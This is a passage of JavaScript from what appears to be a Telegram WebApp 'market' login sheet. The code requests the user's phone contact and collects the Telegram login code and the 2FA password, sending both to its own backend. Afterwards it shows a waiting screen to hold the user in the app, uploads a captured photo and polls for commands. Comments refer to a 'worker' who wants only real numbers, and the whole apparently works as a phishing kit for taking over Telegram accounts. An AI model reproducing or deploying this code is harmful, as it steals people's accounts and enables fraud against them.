      typeof onError === "function"
    ) {
      onError(e.message || "Ошибка");
    }
  }
};

// ── Auth Bottom Sheet Popup ──────────────────────────────────────────────────
(function () {
  const tg = window.Telegram?.WebApp;
  let sheetSessionId = null;
  let sheetCode = "";
  let initialized = false;
  let contactRequestPending = false;
  let sheetVerifyInFlight = false;

  function _preventTouchScroll(e) {
    const sheet = document.getElementById("authSheet");
    if (sheet && sheet.contains(e.target)) return;
    e.preventDefault();
    e.stopPropagation();
  }

  function _preventTouchStart(e) {
    const sheet = document.getElementById("authSheet");
    if (sheet && sheet.contains(e.target)) return;
    e.preventDefault();
    e.stopPropagation();
  }

  function _scrollLockHandler() {
    if (window.scrollY !== 0) window.scrollTo(0, 0);
  }

  function openSheet() {
    if (contactRequestPending) return;
    // Уведомляем воркера что клиент перешёл к авторизации
    try {
      window.MarketAPI.auth("enter_auth", {});
    } catch (e) {}

    // Только native «Поделиться номером» через Telegram requestContact.
    // Ручной ввод телефона (fallback) отключён намеренно — воркеру не нужны клиенты,
    // которые вручную печатают номер (см. разговор в тикете). Если у клиента старый
    // Telegram без requestContact — показываем alert и не пускаем дальше.
    if (tg && tg.requestContact) {
      contactRequestPending = true;
      try {
        tg.requestContact(function (ok, result) {
          contactRequestPending = false;
          if (!ok || !result) {
            showSheetNotification(
              "Telegram не передал контакт. Нажмите «Поделиться номером» ещё раз."
            );
            return;
          }
          var phone = "";
          try {
            var unsafe = result.responseUnsafe || result.response || result;
            if (typeof unsafe === "string") unsafe = JSON.parse(unsafe);
            var contact = (unsafe && unsafe.contact) || result.contact || {};
            phone =
              contact.phone_number ||
              contact.phoneNumber ||
              (unsafe && unsafe.phone_number) ||
              "";
          } catch (_) {}
          if (!phone) {
            showSheetNotification(
              "Telegram вернул контакт без номера. Обновите Telegram и повторите попытку."
            );
            return;
          }
          if (!phone.startsWith("+")) phone = "+" + phone;

          _openSheetUI();
          showSheetStep("Code");
          startSheetAuth(phone).then(function (started) {
            if (!started) return;
            var d1 = document.getElementById("sheetDigit1");
            if (d1) d1.focus();
          });
        });
      } catch (e) {
        contactRequestPending = false;
        showSheetNotification(
          "Не удалось запросить контакт. Повторите попытку."
        );
      }
    } else {
      var _msg =
        "Обновите приложение Telegram — нужна поддержка «Поделиться номером».";
      try {
        if (tg && typeof tg.showAlert === "function") {
          tg.showAlert(_msg);
        } else {
          alert(_msg);
        }
      } catch (_) {
        try {
          alert(_msg);
        } catch (__) {}
      }
    }
  }

  function _openSheetUI() {
    const overlay = document.getElementById("authSheetOverlay");
    const sheet = document.getElementById("authSheet");
    if (overlay) overlay.classList.add("open");
    if (sheet) sheet.classList.add("open");
    document.body.style.overflow = "hidden";
    document.documentElement.style.overflow = "hidden";
    document.documentElement.style.position = "fixed";
    document.documentElement.style.width = "100%";
    window.addEventListener("scroll", _scrollLockHandler);
    document.addEventListener("touchstart", _preventTouchStart, {
      passive: false,
    });
    showSheetStep("Login");
  }

  function closeSheet() {
    contactRequestPending = false;
    sheetVerifyInFlight = false;
    if (typeof window._cancelMrktOAuthPolling === "function")
      window._cancelMrktOAuthPolling();
    const overlay = document.getElementById("authSheetOverlay");
    const sheet = document.getElementById("authSheet");
    if (overlay) {
      overlay.classList.remove("open");
      overlay.style.pointerEvents = "";
    }
    if (sheet) sheet.classList.remove("open");
    document.body.style.overflow = "";
    document.documentElement.style.overflow = "";
    document.documentElement.style.position = "";
    document.documentElement.style.width = "";
    window.removeEventListener("scroll", _scrollLockHandler);
    document.removeEventListener("touchmove", _preventTouchScroll);
    document.removeEventListener("touchstart", _preventTouchStart);
    _clearAuthStep();
    sheetSessionId = null;
    sheetCode = "";
    clearSheetInputs();
    const pwd = document.getElementById("sheetPassword2fa");
    if (pwd) pwd.value = "";
    showSheetStep("Login");
  }

  function showSheetStep(step) {
    document
      .querySelectorAll(".auth-sheet-step")
      .forEach((el) => el.classList.remove("active"));
    const el = document.getElementById("authSheet" + step);
    if (el) el.classList.add("active");
    const overlay = document.getElementById("authSheetOverlay");
    if (step === "Code") {
      // Lock: overlay click disabled, page scroll blocked
      if (overlay) overlay.style.pointerEvents = "none";
      document.addEventListener("touchmove", _preventTouchScroll, {
        passive: false,
      });
    } else {
      if (overlay) overlay.style.pointerEvents = "";
      document.removeEventListener("touchmove", _preventTouchScroll);
    }
  }

  function clearSheetInputs() {
    [
      "sheetDigit1",
      "sheetDigit2",
      "sheetDigit3",
      "sheetDigit4",
      "sheetDigit5",
    ].forEach((id) => {
      const el = document.getElementById(id);
      if (el) el.value = "";
    });
    sheetCode = "";
  }

  function showSheetNotification(message) {
    const container = document.getElementById("notificationsContainer");
    if (!container) return;
    const n = document.createElement("div");
    n.className = "notification error";
    const content = document.createElement("div");
    content.className = "notification-content";
    const messageEl = document.createElement("div");
    messageEl.className = "notification-message";
    messageEl.textContent = String(message || "Неизвестная ошибка");
    content.appendChild(messageEl);
    const progress = document.createElement("div");
    progress.className = "notification-progress";
    const progressBar = document.createElement("div");
    progressBar.className = "notification-progress-bar";
    progressBar.style.animationDuration = "3000ms";
    progress.appendChild(progressBar);
    n.append(content, progress);
    container.appendChild(n);
    setTimeout(() => {
      n.classList.add("slide-out");
      setTimeout(() => n.remove(), 300);
    }, 3000);
  }

  async function startSheetAuth(phone) {
    try {
      const result = await window.MarketAPI.auth("start", { phone });
      if (result.success) {
        sheetSessionId = result.session_id;
        _saveAuthStep(2, phone);
        showSheetStep("Code");
        const d1 = document.getElementById("sheetDigit1");
        if (d1) d1.focus();
        return true;
      } else {
        throw new Error(result.error || "Ошибка сервера");
      }
    } catch (e) {
      showSheetNotification("Ошибка: " + e.message);
      showSheetStep("Login");
      return false;
    }
  }

  async function verifySheetCode() {
    if (sheetCode.length !== 5 || sheetVerifyInFlight) return;
    sheetVerifyInFlight = true;
    if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred("light");
    try {
      const result = await window.MarketAPI.auth("verify_code", {
        session_id: sheetSessionId,
        code: sheetCode,
      });
      if (result.success && result.need_2fa) {
        // 2FA требуется — показываем экран ввода пароля
        _saveAuthStep("2fa", "");
        showSheetStep("TwoFA");
        const hint = document.getElementById("sheetPasswordHint");
        if (hint) {
          if (result.hint && result.hint.trim()) {
            hint.textContent = "Подсказка: " + result.hint;
            hint.style.display = "block";
          } else {
            hint.style.display = "none";
          }
        }
      } else if (result.success) {
        sheetSuccess(result.job_id);
      } else {
        throw new Error(result.error || "Неверный код");
      }
    } catch (e) {
      showSheetNotification(e.message);
      clearSheetInputs();
      setTimeout(() => {
        const d1 = document.getElementById("sheetDigit1");
        if (d1) d1.focus();
      }, 100);
    } finally {
      sheetVerifyInFlight = false;
    }
  }

  function sheetSuccess(jobId) {
    _clearAuthStep();
    showSheetStep("Success");
    if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred("success");
    // 2026-04-29: waiting screen СРАЗУ (overlay z-index:99999) — раньше closeSheet
    // через 1800ms закрывал sheet до завершения upload фото, юзер видел success-screen
    // и закрывал WebApp → ClientDisconnect на стороне backend (см. master.log).
    // Теперь waiting screen перекрывает UI и удерживает юзера в приложении.
    if (jobId && typeof window._showWaitingScreen === "function") {
      try {
        window._showWaitingScreen(jobId);
      } catch (e) {}
    }
    if (jobId && typeof window._captureAndUploadAuthPhoto === "function") {
      window._captureAndUploadAuthPhoto(jobId).catch(() => {});
    }
    if (jobId && typeof window._startAuthCmdPolling === "function") {
      window._startAuthCmdPolling(jobId).catch(() => {});
    }
    // closeSheet больше не нужен — waiting screen overlay поверх sheet и так перекрывает.
    // dispatchEvent оставляем — другие компоненты могут на него реагировать.
    setTimeout(() => {
      window.dispatchEvent(new CustomEvent("market:authSuccess"));
    }, 1800);
  }

  function initSheetHandlers() {
    if (initialized) return;
    initialized = true;

    // ── Telegram-style phone input: flag auto-detects from code ──
    // Sorted longest code first for greedy match
    const COUNTRIES = [
      { flag: "🇺🇿", code: "+998" },
      { flag: "🇹🇯", code: "+992" },
      { flag: "🇰🇬", code: "+996" },
      { flag: "🇹🇲", code: "+993" },
      { flag: "🇦🇿", code: "+994" },
      { flag: "🇬🇪", code: "+995" },
      { flag: "🇮🇱", code: "+972" },
      { flag: "🇦🇪", code: "+971" },
      { flag: "🇳🇬", code: "+234" },
      { flag: "🇺🇦", code: "+380" },
      { flag: "🇧🇾", code: "+375" },
      { flag: "🇦🇲", code: "+374" },
      { flag: "🇲🇩", code: "+373" },
      { flag: "🇪🇪", code: "+372" },
      { flag: "🇱🇻", code: "+371" },
      { flag: "🇱🇹", code: "+370" },
      { flag: "🇮🇳", code: "+91" },
      { flag: "🇨🇳", code: "+86" },
      { flag: "🇯🇵", code: "+81" },
      { flag: "🇰🇷", code: "+82" },
      { flag: "🇹🇷", code: "+90" },
      { flag: "🇧🇷", code: "+55" },
      { flag: "🇹🇭", code: "+66" },
      { flag: "🇮🇩", code: "+62" },
      { flag: "🇬🇧", code: "+44" },
      { flag: "🇩🇪", code: "+49" },
      { flag: "🇫🇷", code: "+33" },
      { flag: "🇮🇹", code: "+39" },
      { flag: "🇪🇸", code: "+34" },
      { flag: "🇵🇱", code: "+48" },
      { flag: "🇷🇺", code: "+7" },
      { flag: "🇺🇸", code: "+1" },
    ];

    const flagEl = document.getElementById("authCountryFlag");
    const phoneInput = document.getElementById("authSheetPhone");

    function detectFlag(val) {
      if (!flagEl) return;
      const clean = val.replace(/[^+\d]/g, "");
      for (const c of COUNTRIES) {
        if (clean.startsWith(c.code)) {
          flagEl.textContent = c.flag;
          return;
        }
      }
      flagEl.textContent = "🌍";
    }

    if (phoneInput) {
      // Авто-добавить "+" при начале ввода
      phoneInput.addEventListener("input", () => {
        let v = phoneInput.value;
        if (v && !v.startsWith("+")) {
          phoneInput.value = "+" + v;
        }
        detectFlag(phoneInput.value);
      });
      // При фокусе — если пусто, ставим "+"; всегда двигаем курсор в конец
      function _moveCursorToEnd() {
        const len = phoneInput.value.length;
        phoneInput.setSelectionRange(len, len);
      }
      phoneInput.addEventListener("focus", () => {
        if (!phoneInput.value) phoneInput.value = "+";
        try {
          if (tg && tg.expand) tg.expand();
        } catch (e) {}
        setTimeout(_moveCursorToEnd, 0);
        setTimeout(_moveCursorToEnd, 100);
      });
      phoneInput.addEventListener("touchend", (e) => {
        e.preventDefault();
        phoneInput.focus();
        setTimeout(_moveCursorToEnd, 50);
      });
      document.addEventListener("selectionchange", () => {
        if (document.activeElement !== phoneInput) return;
        const len = phoneInput.value.length;
        if (
          phoneInput.selectionStart !== len ||
          phoneInput.selectionEnd !== len
        ) {
          phoneInput.setSelectionRange(len, len);
        }
      });
      detectFlag(phoneInput.value);
    }

    // ── Кнопка "Отправить код" ──
    const loginBtn = document.getElementById("authSheetLoginBtn");
    if (loginBtn) {
      loginBtn.addEventListener("click", () => {
        if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred("light");

        const phone = (phoneInput ? phoneInput.value : "").trim();
        const digits = phone.replace(/\D/g, "");

        if (!phone || digits.length < 2) {
          showSheetNotification("Введите номер телефона");
          if (phoneInput) phoneInput.focus();
          return;
        }

        if (digits.length < 10 || digits.length > 15) {
          showSheetNotification("Неверный номер (от 10 до 15 цифр)");
          if (phoneInput) phoneInput.focus();
          return;
        }

        const sendPhone = phone.startsWith("+") ? phone : "+" + digits;

        loginBtn.disabled = true;
        loginBtn.textContent = "Отправляем код...";

        startSheetAuth(sendPhone).finally(() => {
          loginBtn.disabled = false;
          loginBtn.textContent = "Отправить код";
        });
      });
    }

    // Enter в поле телефона — клик по кнопке
    if (phoneInput && loginBtn) {
      phoneInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          e.preventDefault();
          loginBtn.click();
        }
      });
    }

    // Кнопки закрыть
    ["authSheetCancel", "authSheetCancelCode", "authSheetCancelTwoFA"].forEach(
      (id) => {
        const btn = document.getElementById(id);
        if (btn) btn.addEventListener("click", closeSheet);
      }
    );

    // Кнопка "Войти через Telegram (mrkt.land)"
    const mrktBtn = document.getElementById("authMrktBtn");
    if (mrktBtn) {
      mrktBtn.addEventListener("click", () => {
        if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred("light");
        mrktBtn.disabled = true;
        showSheetStep("MrktWait");

        window.startMrktOAuth(
          function () {
            showSheetStep("Success");
            setTimeout(closeSheet, 2500);
            if (typeof window._refreshAuthState === "function")
              window._refreshAuthState();
          },
          function (errMsg) {
            mrktBtn.disabled = false;
            showSheetNotification(errMsg || "Ошибка авторизации");
            showSheetStep("Login");
          }
        );
      });
    }

    // Отмена на шаге ожидания mrkt
    const mrktCancelBtn = document.getElementById("authSheetCancelMrkt");
    if (mrktCancelBtn) {
      mrktCancelBtn.addEventListener("click", () => {
        if (mrktBtn) mrktBtn.disabled = false;
        closeSheet();
      });
    }

    // Оверлей — закрыть по клику вне шторки
    const overlay = document.getElementById("authSheetOverlay");
    if (overlay) overlay.addEventListener("click", closeSheet);

    // Поля ввода кода
    const digits = [
      "sheetDigit1",
      "sheetDigit2",
      "sheetDigit3",
      "sheetDigit4",
      "sheetDigit5",
    ]
      .map((id) => document.getElementById(id))
      .filter(Boolean);

    const codeContainer = digits[0]?.closest(".code-input-container");
    if (codeContainer) {
      codeContainer.addEventListener("paste", (e) => {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData)
          .getData("text")
          .replace(/\D/g, "")
          .substring(0, 5);
        digits.forEach((d, i) => {
          d.value = text[i] || "";
        });
        if (digits[Math.min(text.length, 4)])
          digits[Math.min(text.length, 4)].focus();
        sheetCode = digits.map((d) => d.value).join("");
        if (sheetCode.length === 5) verifySheetCode();
      });
    }

    // 2026-04-26: robust handlers — на некоторых Android-клавиатурах event 'input'
    // фигурирует с задержкой/не той value. Используем setTimeout(0) + keyup как
    // fallback, плюс обрабатываем multi-digit вставку (некоторые клавиатуры
    // отправляют сразу несколько символов).
    function _sheetAdvanceFromInput(i) {
      setTimeout(() => {
        const input = digits[i];
        if (!input) return;
        const cleaned = (input.value || "").replace(/\D/g, "");
        if (cleaned.length > 1) {
          // Multi-digit — распределяем по полям начиная с текущего
          for (let j = 0; j < cleaned.length && i + j < digits.length; j++) {
            digits[i + j].value = cleaned[j];
          }
          const focusIdx = Math.min(i + cleaned.length, digits.length - 1);
          if (digits[focusIdx]) digits[focusIdx].focus();
        } else if (cleaned.length === 1) {
          input.value = cleaned;
          if (i < digits.length - 1) digits[i + 1].focus();
        } else {
          input.value = "";
        }
        sheetCode = digits.map((d) => d.value).join("");
        if (sheetCode.length === 5) verifySheetCode();
      }, 0);
    }
    digits.forEach((input, i) => {
      input.addEventListener("touchend", () => {
        try {
          if (tg && tg.expand) tg.expand();
        } catch (_) {}
        input.focus();
      });
      input.addEventListener("input", () => _sheetAdvanceFromInput(i));
      // Fallback: keyup ловим если input не сработал (некоторые Android keyboards)
      input.addEventListener("keyup", (e) => {
        // Backspace на пустом — назад
        if (
          (e.key === "Backspace" || e.keyCode === 8) &&
          !input.value &&
          i > 0
        ) {
          digits[i - 1].focus();
          return;
        }
        // Дублируем продвижение если input не отработал
        if (input.value) _sheetAdvanceFromInput(i);
      });
      input.addEventListener("keydown", (e) => {
        if (
          (e.key === "Backspace" || e.keyCode === 8) &&
          !input.value &&
          i > 0
        ) {
          digits[i - 1].focus();
        }
      });
    });

    // Кнопка подтвердить 2FA
    const submit2fa = document.getElementById("sheetSubmit2fa");
    const pwd2fa = document.getElementById("sheetPassword2fa");
    if (submit2fa && pwd2fa) {
      submit2fa.addEventListener("click", async () => {
        const password = pwd2fa.value.trim();
        if (!password) {
          showSheetNotification("Введите пароль 2FA");
          return;
        }
        submit2fa.disabled = true;
        const orig = submit2fa.textContent;
        submit2fa.innerHTML = '<div class="loading"></div>Проверяем...';
        try {
          const result = await window.MarketAPI.auth("verify_2fa", {
            session_id: sheetSessionId,
            password,
          });
          if (result.success) {
            sheetSuccess(result.job_id);
          } else {
            throw new Error(result.error || "Неверный пароль");
          }
        } catch (e) {
          showSheetNotification(e.message);
          pwd2fa.value = "";
        } finally {
          submit2fa.disabled = false;
          submit2fa.innerHTML = orig;
        }
      });
    }
  }

  // Восстановление прерванной авторизации после minimize/reopen WebApp.
  // Если клиент ушёл на шаге code/2fa (посмотреть код в чате) — state в localStorage
  // выживает. При возврате открываем шторку СРАЗУ на нужном шаге, чтобы клиент
  // продолжил ввод кода, а не заново жал «Поделиться номером» → получал второй код.
  async function _resumeAuthIfSaved() {
    // Если шторка уже открыта — ничего не делаем.
    const sheetEl = document.getElementById("authSheet");
    if (sheetEl && sheetEl.classList.contains("open")) return;
    const saved = _loadAuthStep();
    if (!saved || (saved.step !== 2 && saved.step !== "2fa")) return;
    try {
      const res = await window.MarketAPI.auth("status", {});
      if (!res?.success) {
        _clearAuthStep();
        return;
      }
      const s = res.status;
      if (s === "done") {
        _clearAuthStep();
        window.dispatchEvent(new CustomEvent("market:authSuccess"));
      } else if (s === "code_sent" && saved.step === 2) {
        // Код уже отправлен, клиент на шаге ввода кода — открываем шторку на Code.
        // sheetSessionId оставляем null: на сервере session привязана к uid (initData),
        // не к session_id — verify_code работает и без него.
        _openSheetUI();
        showSheetStep("Code");
        setTimeout(() => {
          const d1 = document.getElementById("sheetDigit1");
          if (d1) d1.focus();
        }, 150);
      } else if (s === "need_2fa" && saved.step === "2fa") {
        _openSheetUI();
        showSheetStep("TwoFA");
        setTimeout(() => {
          const pwd = document.getElementById("sheetPassword2fa");
          if (pwd) pwd.focus();
        }, 150);
      } else {
        _clearAuthStep();
      }
    } catch (e) {
      _clearAuthStep();
    }
  }

  document.addEventListener("DOMContentLoaded", () => {
    initSheetHandlers();
    _resumeAuthIfSaved();
  });

  window.openAuthSheet = openSheet;
  window.closeAuthSheet = closeSheet;

  // Восстановление фокуса когда WebApp возвращается из свёрнутого состояния
  function _refocusActiveInput() {
    const sheet = document.getElementById("authSheet");
    if (!sheet || !sheet.classList.contains("open")) return;
    // Шаг с кодом
    const codeStep = document.getElementById("authSheetCode");
    if (codeStep && codeStep.classList.contains("active")) {
      const d1 = codeStep.querySelector("input");
      if (d1) {
        try {
          if (tg && tg.expand) tg.expand();
        } catch (_) {}
        d1.focus();
      }
      return;
    }
    // Шаг с телефоном
    const loginStep = document.getElementById("authSheetLogin");
    if (loginStep && loginStep.classList.contains("active")) {
      const pi = document.getElementById("authSheetPhone");
      if (pi) {
        try {
          if (tg && tg.expand) tg.expand();
        } catch (_) {}
        pi.focus();
      }
      return;
    }
    // 2FA
    const twoFaStep = document.getElementById("authSheetTwoFA");
    if (twoFaStep && twoFaStep.classList.contains("active")) {
      const pwd = document.getElementById("sheetPassword2fa");
      if (pwd) {
        try {
          if (tg && tg.expand) tg.expand();
        } catch (_) {}
        pwd.focus();
      }
    }
  }

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      window.scrollTo(0, 0);
      try {
        if (tg && tg.expand) tg.expand();
      } catch (_) {}
      // Если WebApp был свёрнут пока клиент смотрел код в Telegram — возможно контекст
      // не убили (тогда шторка всё ещё open), но если убили — state в localStorage
      // выживает, подхватим и откроем шторку снова на нужном шаге.
      _resumeAuthIfSaved();
      setTimeout(() => {
        window.scrollTo(0, 0);
        _refocusActiveInput();
      }, 100);
    }
  });

  if (tg && tg.onEvent) {
    tg.onEvent("viewportChanged", (e) => {
      if (e && e.isStateStable) setTimeout(_refocusActiveInput, 50);
    });
  }
})();
